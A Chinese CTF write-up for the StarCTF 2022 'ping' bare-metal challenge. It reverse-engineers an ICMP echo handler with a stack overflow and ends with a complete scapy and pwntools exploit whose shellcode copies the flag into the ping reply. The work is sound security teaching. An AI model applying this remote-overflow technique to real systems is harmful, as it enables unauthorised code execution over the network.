---
title: StarCTF 2022 Bare Metal Pwn ping
categories:
- CTF/Pwn
tags: 
---

> 更新中...题目打法很好玩，和目标的交互方式只有ping，所以必然是通过ICMP打。ICMP栈溢出。

![image](https://xuanxuanblingbling.github.io/assets/pic/starctf/ping.png)

- 附件：[ping.zip](https://xuanxuanblingbling.github.io/assets/attachment/starctf/ping.zip)

## 基础

### 本地启动

通过测试，本地可以删掉run.sh中对权限，时间，不显示界面等限制：

```c
sudo setpriv --reuid=nobody --regid=netdev --init-groups \
timeout 60 \
-display none 
```

脚本中使用了iptables和tunctl，所以还是需要在linux上运行，修改完后的脚本如下：

```c
#! /bin/sh

sudo tunctl -t tap100 -u nobody
sudo ifconfig tap100 10.10.10.2/24

sudo iptables -P FORWARD ACCEPT
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j REJECT 
sudo iptables -t nat -I PREROUTING -p icmp -d 0.0.0.0/0 -j DNAT --to-destination 10.10.10.10
sudo iptables -t nat -I POSTROUTING -p icmp -d 10.10.10.10 -j SNAT --to-source 10.10.10.2
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

while true;
do
    sudo rm -f /tmp/flag.txt
    sudo cp flag.txt /tmp
    sudo chmod 644 /tmp/flag.txt
    sudo chown nobody /tmp/flag.txt
    qemu-system-i386 -cdrom kernel.iso \
        -hda /tmp/flag.txt \
        -netdev tap,id=n1,ifname=tap100,script=no,downscript=no \
        -device virtio-net-pci,netdev=n1,mac=01:02:03:04:05:06 \
        -m 64M \
        -monitor /dev/null
    sleep 1
done
```

如果在ubuntu 20.04以上不带tunctl需要安装`uml-utilities`：

```
➜  sudo apt install uml-utilities
```

使用root用户运行脚本后，会多出一个tap100网卡，ip为10.10.10.2：

```c
➜  ifconfig
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.11.11.3  netmask 255.255.255.0  broadcast 10.11.11.255
        inet6 fe80::852c:9f41:3f1e:4ddc  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:e1:78:cd  txqueuelen 1000  (Ethernet)
        RX packets 772941  bytes 882959078 (882.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 410544  bytes 34556453 (34.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2026  bytes 178023 (178.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2026  bytes 178023 (178.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tap100: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 10.10.10.2  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::1ccd:29ff:feb7:deae  prefixlen 64  scopeid 0x20<link>
        ether 1e:cd:29:b7:de:ae  txqueuelen 1000  (Ethernet)
        RX packets 26  bytes 2156 (2.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 174  bytes 48602 (48.6 KB)
        TX errors 0  dropped 13 overruns 0  carrier 0  collisions 0
```

并QEMU中的目标题目，显示load flag 以及 ping me：

![image](https://xuanxuanblingbling.github.io/assets/pic/starctf/qemu.png)

根据启动脚本，可以推测题目ip为10.10.10.10，启动后在本机ping目标可以成功：

```c
➜   ping 10.10.10.10
PING 10.10.10.10 (10.10.10.10) 56(84) bytes of data.
64 bytes from 10.10.10.10: icmp_seq=1 ttl=64 time=2.27 ms
64 bytes from 10.10.10.10: icmp_seq=2 ttl=64 time=0.849 ms
64 bytes from 10.10.10.10: icmp_seq=3 ttl=64 time=0.257 ms
^C
--- 10.10.10.10 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3015ms
rtt min/avg/max/mdev = 0.257/1.007/2.268/0.758 ms
```

并且在外部对linux虚拟机ip 10.11.11.3也可以ping通：

```c
➜  ping 10.11.11.3        
PING 10.11.11.3 (10.11.11.3): 56 data bytes
64 bytes from 10.11.11.3: icmp_seq=0 ttl=62 time=0.947 ms
64 bytes from 10.11.11.3: icmp_seq=1 ttl=62 time=0.991 ms
64 bytes from 10.11.11.3: icmp_seq=2 ttl=62 time=1.006 ms
^C
--- 10.11.11.3 ping statistics ---
3 packets transmitted, 3 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 0.947/0.981/1.006/0.025 ms
```

关闭QEMU后均ping不通：

```c
➜  ping 10.11.11.3
PING 10.11.11.3 (10.11.11.3): 56 data bytes
Request timeout for icmp_seq 0
```

证明我们对虚拟机本机发送的ICMP报文已经转发到QEMU中的题目系统进行处理了，即可以正常做题了。另外在我本地测试的过程中，会有一些细节问题：

- 在ubuntu18.04，qemu 2.11.1中启动后，需要先在本地ping通10.10.10.10，然后才能在外部ping通本机ip
- 在ubuntu20.04，qemu 4.2.1中启动后，外部直接就能ping通

后续等宿主机真正ping通linux虚拟机后，做题流程才比较正常，不太会发生奇怪的现象。

### 开启调试

iptables等环境配置一次就行了，之后每次只需要单独启动qemu就行，添加`-S -s`参数开启调试，另外如果只用ssh连接linux进行调试，则需要把图形界面关了`-nographic`：

```c
qemu-system-i386 -cdrom kernel.iso \
        -hda /tmp/flag.txt \
        -netdev tap,id=n1,ifname=tap100,script=no,downscript=no \
        -device virtio-net-pci,netdev=n1,mac=01:02:03:04:05:06 \
        -m 64M -nographic \
        -s -S \
        -monitor /dev/null
```

然后gdb只需要连接本机即可：

```c
➜  gdb
pwndbg> target remote :1234
Remote debugging using :1234
warning: No executable has been specified and target does not support
determining executable automatically.  Try using the "file" command.
0x0000fff0 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────
 EAX  0 ◂— 0
 EBX  0 ◂— 0
 ECX  0 ◂— 0
 EDX  0x663 —▸ 0 ◂— 0
 EDI  0 ◂— 0
 ESI  0 ◂— 0
 EBP  0 ◂— 0
 ESP  0 ◂— 0
 EIP  0xfff0 —▸ 0 ◂— 0
─────────────────────────────────────────[ DISASM ]──────────────────────────────────────────
 ► 0xfff0     add    byte ptr [eax], al
   0xfff2     add    byte ptr [eax], al
   0xfff4     add    byte ptr [eax], al
   0xfff6     add    byte ptr [eax], al
   0xfff8     add    byte ptr [eax], al
   0xfffa     add    byte ptr [eax], al
   0xfffc     add    byte ptr [eax], al
   0xfffe     add    byte ptr [eax], al
   0x10000    add    byte ptr [eax], al
   0x10002    add    byte ptr [eax], al
   0x10004    add    byte ptr [eax], al
──────────────────────────────────────────[ STACK ]──────────────────────────────────────────
00:0000│ eax ebx ecx edi esi ebp esp eflags-2 0 ◂— 0
01:0004│                                      4 —▸ 0 ◂— 0
────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────
 ► f 0   0xfff0
─────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

### 确定目标

qemu的参数为`-cdrom kernel.iso`，所以目标就是这个iso，识别为CD-ROM filesystem：

```
➜  file kernel.iso 
kernel.iso: ISO 9660 CD-ROM filesystem data (DOS/MBR boot sector) 'ISOIMAGE' (bootable)
```

在Mac上，binwalk没识别出来什么东西：

```
➜  binwalk kernel.iso 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
2048          0x800           ISO 9660 Boot Record,
```

但我linux上的binwalk能拆除来一堆ELF，不过其实CD-ROM filesystem随便找个解压工具就能解开，linux下也可以挂载：

```c
➜  mkdir kernel
➜  sudo mount -o loop ./kernel.iso ./kernel
➜  ls -al ./kernel/boot 
total 53
dr-xr-xr-x 1 root root  2048 4月  15 23:29 .
dr-xr-xr-x 1 root root  2048 4月  15 23:29 ..
dr-xr-xr-x 1 root root  2048 4月  15 23:29 grub
-r-xr-xr-x 1 root root 47556 4月  15 23:29 kernel.elf
➜  file ./kernel/boot/kernel.elf
ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped
```

分析这个kernel.elf容易看到函数存在load flag和ping me相关字符串的使用，所以这个elf肯定就是目标了：

```c
void __noreturn sub_10000C()
{
  char *v0; // [esp-Ch] [ebp-14h]

  sub_1089E7(&dword_10B000, 0, (char *)&dword_10C0D0 - (char *)&dword_10B000);
  sub_10899B();
  sub_106C4A();
  sub_107AB9((int)&unk_200000, (int)dword_100000);
  sub_107F34(byte_300000);
  sub_1076D1();
  sub_103287();
  sub_103404();
  sub_10063B();
  sub_102D25();
  sub_1025A8();
  sub_1029D4();
  sub_107888();
  sub_1034AB();
  dword_10C0D0 = sub_107E9E(1024, 0x10000);
  sub_103910(0);
  sub_104536(0, 1, 0, dword_10C0D0);
  sub_1083B7("load flag:%s\n", (char *)dword_10C0D0);
  sub_1083B7("ping me...\n", v0);
  if ( dword_10C264 )
  {
    sub_101F9F((int)&byte_10C8A0 + 12, dword_10C264 - 12, (int)&unk_10C280, &dword_10C878);
    dword_10C264 = 0;
  }
  if ( dword_10C878 )
  {
    sub_101F05(&unk_10C280, dword_10C878);
    dword_10C878 = 0;
  }
  __halt();
}
```

IDA对此elf分析只有100多个函数，所以这个kernel.elf应该就是一个运行在裸机上的小系统，可以理解为Bare Metal。在后文会有对这个系统更详细的分析与理解。


## 漏洞

比赛的时候很快就有队伍做出来了，并且题面为ping me，所以猜测大概率是icmp包的数据过长引发的栈溢出，类似死亡之ping。

### 发送测试

如何发送一个较长的ping包？推测ping工具本身应该就可以，查看man手册：

```
➜  man ping
PING(8)                                                 iputils                                                PING(8)

NAME
       ping - send ICMP ECHO_REQUEST to network hosts

       ...

       -s packetsize
           Specifies the number of data bytes to be sent. The default is 56, which translates into 64 ICMP data bytes
           when combined with the 8 bytes of ICMP header data.
       ...

       -p pattern
           You may specify up to 16 “pad” bytes to fill out the packet you send. This
           is useful for diagnosing data-dependent problems in a network. For example,
           -p ff will cause the sent packet to be filled with all ones.
       ...
```

所以通过-s参数就可以指定长度，另外-p参数可以控制发送的数据。所以进行测试，首先可以正常ping通目标，然后发一个较长报文：

```c
➜  ~ ping 10.11.11.3     
PING 10.11.11.3 (10.11.11.3): 56 data bytes
64 bytes from 10.11.11.3: icmp_seq=0 ttl=62 time=0.747 ms
64 bytes from 10.11.11.3: icmp_seq=1 ttl=62 time=0.596 ms
^C
--- 10.11.11.3 ping statistics ---
2 packets transmitted, 2 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 0.596/0.671/0.747/0.076 ms

➜  ~ ping -s 1000 10.11.11.3
PING 10.11.11.3 (10.11.11.3): 1000 data bytes
Request timeout for icmp_seq 0
Request timeout for icmp_seq 1
^C
--- 10.11.11.3 ping statistics ---
3 packets transmitted, 0 packets received, 100.0% packet loss

➜  ~ ping 10.11.11.3        
PING 10.11.11.3 (10.11.11.3): 56 data bytes
Request timeout for icmp_seq 0
Request timeout for icmp_seq 1
^C
--- 10.11.11.3 ping statistics ---
3 packets transmitted, 0 packets received, 100.0% packet loss
```

发现当发送过长报文后，目标无法ping通，并且在我ubuntu18.04下qemu2.11.1会打印如下信息并退出：

```c
qemu-system-i386: Trying to execute code outside RAM or ROM at 0xfbfaf9f8
This usually means one of the following happened:

(1) You told QEMU to execute a kernel for the wrong machine type, and it crashed on startup (eg trying to)
(2) You didn't give QEMU a kernel or BIOS filename at all, and QEMU executed a ROM full of no-op instructd
(3) Your guest kernel has a bug and crashed by jumping off into nowhere

This is almost always one of the first two, so check your command line and that you are using the right t.
If you think option (3) is likely then you can try debugging your guest with the -d debug options; in par.

Execution cannot continue; stopping here.
```

gdb也会直接断开，ubuntu20.04下的qemu 4.2.1不会有任何反映，但目标也无法ping通。

```
pwndbg> c
Continuing.
Remote connection closed
pwndbg> 
```

看起来是成功了，不过还没有很确定，所以首先我们应该能更精准控制发送的ping包，所以使用scapy进行发包：

```python
from scapy.all import *
send(IP(dst="10.11.11.3")/ICMP()/(b'a'*1000))
```

发送后，目标崩溃打印的信息中的0x61616161，看起来的确像控制流劫持了：

```c
➜  sudo ./run.sh
WARNING: Image format was not specified for '/tmp/flag.txt' and probing guessed raw.
         Automatically detecting the format is dangerous for raw images, write operations on block 0 will.
         Specify the 'raw' format explicitly to remove the restrictions.
qemu-system-i386: Trying to execute code outside RAM or ROM at 0x61616161
This usually means one of the following happened:

(1) You told QEMU to execute a kernel for the wrong machine type, and it crashed on startup (eg trying to)
(2) You didn't give QEMU a kernel or BIOS filename at all, and QEMU executed a ROM full of no-op instructd
(3) Your guest kernel has a bug and crashed by jumping off into nowhere

This is almost always one of the first two, so check your command line and that you are using the right t.
If you think option (3) is likely then you can try debugging your guest with the -d debug options; in par.

Execution cannot continue; stopping here.
```

但gdb没有断到这里，那如何更加确认呢？有两种办法，逆向和调试。

### 代码分析

看起来很像栈溢出，所以先找memcpy，容易发现，sub_108AA9就是memcpy：

```c
_BYTE *__cdecl sub_108AA9(_BYTE *a1, _BYTE *a2, int a3)
{
  _BYTE *v3; // edx
  _BYTE *v4; // eax
  _BYTE *i; // [esp+8h] [ebp-8h]

  for ( i = a1; a3--; ++i )
  {
    v3 = a2++;
    v4 = i;
    *v4 = *v3;
  }
  return a1;
}
```

找到memcpy后，分析对其的引用，进而发现sub_102214调用了memcpy，拷贝目标为函数参数a3：

```c
_DWORD *__cdecl sub_102214(int a1, int a2, int a3, _DWORD *a4)
{
    ...
    memcpy((_BYTE *)(a3 + 24), (_BYTE *)(v5 + 4), v6 - 4);
    ...
```

函数sub_101F9F调用了sub_102214，并且第三个参数为位于其栈上的v8的地址，此段栈空间大小为512字节：

```c
_DWORD *__cdecl sub_101F9F(int a1, int a2, int a3, _DWORD *a4)
{
  _DWORD *result; // eax
  int v5; // eax
  int v6; // eax
  int v7; // [esp+4h] [ebp-214h] BYREF
  char v8[512]; // [esp+8h] [ebp-210h] BYREF
  int v9; // [esp+208h] [ebp-10h]
  int v10; // [esp+20Ch] [ebp-Ch]

  if ( a2 > 13 )
  {
    v10 = a1;
    v5 = *(unsigned __int16 *)(a1 + 12);
    if ( v5 == 8 )
    {
      sub_102214(v10 + 14, a2 - 14, (int)v8, &v7);
      ...
```

感觉很像这里，所以可以进行调试确认

### 调试确认

首先可以将断点打在sub_102214调用memcpy时，即0x10233F，然后发送payload并观察：

```python
from scapy.all import *
send(IP(dst="10.11.11.3")/ICMP()/(b'a'*1000))
```

注意要先ping通，所以可以先不打断，ping通后在gdb中按contorl+c然后在打断：

```c
Breakpoint 1, 0x0010233f in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────[ REGISTERS ]─────────────────────────────────
 EAX  0x1907dd8 —▸ 0x4005daf —▸ 0 —▸ 0xf000ff53 ◂— 0
 EBX  0x10a6b4 —▸ 0 —▸ 0xf000ff53 ◂— 0
*ECX  0x3ec —▸ 0xf000ff53 —▸ 0 ◂— push   ebx /* 0xf000ff53 */
 EDX  0x10c8d2 —▸ 0 —▸ 0xf000ff53 ◂— 0
 EDI  0 —▸ 0xf000ff53 ◂— 0
 ESI  0 —▸ 0xf000ff53 ◂— 0
 EBP  0x1907da0 —▸ 0x1907fd0 —▸ 0x1907ff0 —▸ 0 —▸ 0xf000ff53 ◂— ...
 ESP  0x1907d78 —▸ 0x1907dd8 —▸ 0x4005daf —▸ 0 —▸ 0xf000ff53 ◂— ...
 EIP  0x10233f —▸ 0x6765e8 —▸ 0 —▸ 0xf000ff53 ◂— 0
──────────────────────────────────[ DISASM ]──────────────────────────────────
 ► 0x10233f    call   0x108aa9                      <0x108aa9>
 
   0x102344    add    esp, 0x10
   0x102347    mov    eax, dword ptr [ebp + 0x10]
   0x10234a    mov    dword ptr [ebp - 0x18], eax
   0x10234d    mov    eax, dword ptr [ebp - 0x18]
   0x102350    movzx  edx, byte ptr [eax]
   0x102353    and    edx, 0xf
   0x102356    or     edx, 0x40
   0x102359    mov    byte ptr [eax], dl
   0x10235b    mov    eax, dword ptr [ebp - 0x18]
   0x10235e    movzx  edx, byte ptr [eax]
──────────────────────────────────[ STACK ]───────────────────────────────────
00:0000│ esp 0x1907d78 —▸ 0x1907dd8 —▸ 0x4005daf —▸ 0 —▸ 0xf000ff53 ◂— ...
01:0004│     0x1907d7c —▸ 0x10c8d2 —▸ 0 —▸ 0xf000ff53 ◂— 0
02:0008│     0x1907d80 —▸ 0x3ec —▸ 0xf000ff53 —▸ 0 ◂— push   ebx /* 0xf000ff53 */
03:000c│     0x1907d84 —▸ 0x404 —▸ 0 —▸ 0xf000ff53 ◂— 0
04:0010│     0x1907d88 —▸ 0x1907dc0 —▸ 0x54000045 —▸ 0 —▸ 0xf000ff53 ◂— ...
05:0014│     0x1907d8c —▸ 0x1907dd4 —▸ 0xcdcd0000 —▸ 0 —▸ 0xf000ff53 ◂— ...
06:0018│     0x1907d90 —▸ 0x10c8ce —▸ 0xcdc50008 —▸ 0 —▸ 0xf000ff53 ◂— ...
07:001c│     0x1907d94 —▸ 0x40403f0 —▸ 0 —▸ 0xf000ff53 ◂— 0
────────────────────────────────[ BACKTRACE ]─────────────────────────────────
 ► f 0 0x10233f
   f 1 0x10202b
   f 2 0x10014b
──────────────────────────────────────────────────────────────────────────────
pwndbg> x /20gx 0x10c8d2
0x10c8d2:       0x6161616100000000      0x6161616161616161
0x10c8e2:       0x6161616161616161      0x6161616161616161
0x10c8f2:       0x6161616161616161      0x6161616161616161
0x10c902:       0x6161616161616161      0x6161616161616161
0x10c912:       0x6161616161616161      0x6161616161616161
0x10c922:       0x6161616161616161      0x6161616161616161
0x10c932:       0x6161616161616161      0x6161616161616161
0x10c942:       0x6161616161616161      0x6161616161616161
0x10c952:       0x6161616161616161      0x6161616161616161
0x10c962:       0x6161616161616161      0x6161616161616161
pwndbg> 
```

推测应该会盖掉sub_101F9F函数的栈，此函数的返回地址为0x10014B：

```c
pwndbg> bt
#0  0x0010233f in ?? ()
#1  0x0010202b in ?? ()
#2  0x0010014b in ?? ()
#3  0x00107974 in ?? ()
```

所以继续将断点打在sub_101F9F函数返回前，即0x1020C5：

```c
pwndbg> b * 0x1020C5
Breakpoint 1 at 0x1020c5
pwndbg> c
Continuing.

Breakpoint 1, 0x001020c5 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────[ REGISTERS ]─────────────────────────────────
*EAX  0x61616161 —▸ 0 —▸ 0xf000ff53 ◂— 0
*EBX  0x61616161 —▸ 0 —▸ 0xf000ff53 ◂— 0
*ECX  0x61616573 —▸ 0 —▸ 0xf000ff53 ◂— 0
*EDX  0x412 —▸ 0x27f00 —▸ 0 —▸ 0xf000ff53 ◂— 0
 EDI  0 —▸ 0xf000ff53 ◂— 0
 ESI  0 —▸ 0xf000ff53 ◂— 0
*EBP  0x61616161 —▸ 0 —▸ 0xf000ff53 ◂— 0
*ESP  0x1907fd4 —▸ 0x61616161 —▸ 0 —▸ 0xf000ff53 ◂— 0
*EIP  0x1020c5 —▸ 0xe58955c3 —▸ 0 —▸ 0xf000ff53 ◂— 0
──────────────────────────────────[ DISASM ]──────────────────────────────────
 ► 0x1020c5      ret    <0x61616161>
    ↓
   0x61616161    add    byte ptr [eax], al
    ↓
   0x61616161    add    byte ptr [eax], al


──────────────────────────────────[ STACK ]───────────────────────────────────
00:0000│ esp 0x1907fd4 —▸ 0x61616161 —▸ 0 —▸ 0xf000ff53 ◂— 0
... ↓        7 skipped
────────────────────────────────[ BACKTRACE ]─────────────────────────────────
 ► f 0 0x1020c5
   f 1 0x61616161
──────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

经过确认，栈溢出的数据长度为504:

```python
from pwn import *
from scapy.all import *

payload = b'a'*504 + p32(0xdeadbeef)
send(IP(dst="10.11.11.3")/ICMP()/payload)
```

成功劫持eip指针到0xdeadbeef：

```c
pwndbg> c
Continuing.

Breakpoint 1, 0x001020c5 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────[ REGISTERS ]─────────────────────────────────
 EAX  0x10c878 —▸ 0x226 —▸ 0xff53f000 —▸ 0 —▸ 0xf000ff53 ◂— ...
*EBX  0x61616161 —▸ 0 —▸ 0xf000ff53 ◂— 0
*ECX  0x10c4a6 —▸ 0 —▸ 0xf000ff53 ◂— 0
*EDX  0x226 —▸ 0xff53f000 —▸ 0 —▸ 0xf000ff53 ◂— 0
 EDI  0 —▸ 0xf000ff53 ◂— 0
 ESI  0 —▸ 0xf000ff53 ◂— 0
*EBP  0x61616161 —▸ 0 —▸ 0xf000ff53 ◂— 0
 ESP  0x1907fd4 —▸ 0xdeadbeef —▸ 0 —▸ 0xf000ff53 ◂— 0
 EIP  0x1020c5 —▸ 0xe58955c3 —▸ 0 —▸ 0xf000ff53 ◂— 0
──────────────────────────────────[ DISASM ]──────────────────────────────────
 ► 0x1020c5      ret    <0xdeadbeef>
```

那为什么之前gdb不会像以前的pwn一样自动的断到这里呢？

## 利用

### ICMP

### 函数逆向

```c
void __noreturn sub_10000C()
{
  ...

  printf("load flag:%s\n", (char *)flag_ptr);
  printf("ping me...\n", v0);
  if ( dword_10C264 )
  {
    sub_101F9F((int)&byte_10C8A0 + 12, dword_10C264 - 12, (int)&unk_10C280, &dword_10C878);
    dword_10C264 = 0;
  }
  if ( dword_10C878 )
  {
    sub_101F05(&unk_10C280, dword_10C878);
    dword_10C878 = 0;
  }
```


### 计算校验和


- [icmp包检验和计算方法及python实现](http://yaxin-cn.github.io/Python/icmp-packet-checksum-with-python.html)

```c
_DWORD *__cdecl sub_102214(int a1, int a2, int a3, _DWORD *a4)
{
  _DWORD *result; // eax
  int v5; // [esp+8h] [ebp-10h]
  unsigned __int16 v6; // [esp+Ch] [ebp-Ch]
  unsigned __int16 v7; // [esp+Eh] [ebp-Ah]

  v7 = sub_101A57(*(_WORD *)(a1 + 2));
  if ( a2 > 20
    && *(_BYTE *)(a1 + 9) == 1
    && *(_DWORD *)(a1 + 16) == dword_10A268
    && *(_DWORD *)(a1 + 12) == unk_10C268
    && (*(_BYTE *)a1 & 0xF0) == 64
    && v7 > 4 * (*(_BYTE *)a1 & 0xF) )
  {
    v6 = v7 - 4 * (*(_BYTE *)a1 & 0xF);
    v5 = 4 * (*(_BYTE *)a1 & 0xF) + a1;
    if ( v6 > 3u && *(_BYTE *)v5 == 8 )
    {
      *(_BYTE *)(a3 + 20) = 0;
      *(_BYTE *)(a3 + 21) = *(_BYTE *)(v5 + 1);
      *(_WORD *)(a3 + 22) = *(_WORD *)(v5 + 2) + 8;           // fill icmp reply checksum !!
      memcpy((_BYTE *)(a3 + 24), (_BYTE *)(v5 + 4), v6 - 4);  // overflow !!
      *(_BYTE *)a3 = *(_BYTE *)a3 & 0xF | 0x40;
      *(_BYTE *)a3 = *(_BYTE *)a3 & 0xF0 | 5;
      *(_WORD *)(a3 + 6) = 0;
      *(_BYTE *)(a3 + 1) = 0;
      *(_WORD *)(a3 + 2) = *(_WORD *)(a1 + 2);
      *(_WORD *)(a3 + 6) = 0;
      *(_BYTE *)(a3 + 8) = *(_BYTE *)(a1 + 8);
      *(_BYTE *)(a3 + 9) = 1;
      *(_DWORD *)(a3 + 12) = dword_10A268;
      *(_DWORD *)(a3 + 16) = unk_10C268;
      *(_WORD *)(a3 + 10) = 0;
      *a4 = v7;
      return (_DWORD *)sub_102455(a3);                        // calc and fill ip header checksum !!
```


```c
int __cdecl sub_102455(int a1)
{
  int result; // eax

  *(_WORD *)(a1 + 10) = 0;
  result = sub_1023E3(a1, 4 * (*(_BYTE *)a1 & 0xF));
  *(_WORD *)(a1 + 10) = result;
  return result;
}
```

```c
int __cdecl sub_1023E3(__int16 *a1, unsigned int a2)
{
  unsigned int v2; // ebx
  unsigned __int16 *v3; // eax
  __int16 v4; // si

  v2 = 0;
  while ( a2 > 1 )
  {
    v3 = (unsigned __int16 *)a1++;
    v2 += *v3;
    a2 -= 2;
  }
  if ( a2 )
  {
    v4 = *a1;
    v2 += (unsigned __int16)(v4 & sub_101A57(65280));
  }
  while ( HIWORD(v2) )
    v2 = (unsigned __int16)v2 + HIWORD(v2);
  return ~v2;
}
```

### 最终exp

```python
from scapy.all import *
from pwn import *
context(arch='x86')

# ----data----
# flag      addr 0x350000
# shellcode addr 0x10c8e0

# ----reply package----
# icmp_head addr 0x10c2a2
# checksum  addr 0x10c2a4
# flag back addr 0x10c370

# ----function----
# memcpy         addr 0x108AA9
# reply          addr 0x10014B
# calc_checksum  addr 0x1023E3

shellcode = asm('''
    // memcpy(0x10c370,0x350000,0x20)
    push 0x20
    push 0x350000
    push 0x10c370
    mov  eax, 0x108AA9
    call eax
    add  esp, 0xc
    
    // clear icmp checksum
    xor eax, eax
    mov ebx, 0x10c2a4
    mov [ebx],ax
    
    // calc icmp checksum 
    push 516
    push 0x10c2a2
    mov  eax, 0x1023E3
    call eax
    add  esp, 0x8
    
    // write back icmp checksum
    mov  ebx, 0x10c2a4
    mov  [ebx],ax

    // return to reply
    mov  eax, 0x10014B
    jmp  eax
''')

payload  = b'a' * 10     # shellcode addr padding
payload += shellcode.ljust(478,b'b')
payload += p32(0x10C8Ac) # v10
payload += p32(0)*3
payload += p32(0x10c8e0) # shellcode addr

p = sr1(IP(dst="10.11.11.3")/ICMP()/payload)
print(p)
```

## 幕后

### 流量转发

### 最简系统

### 网卡实现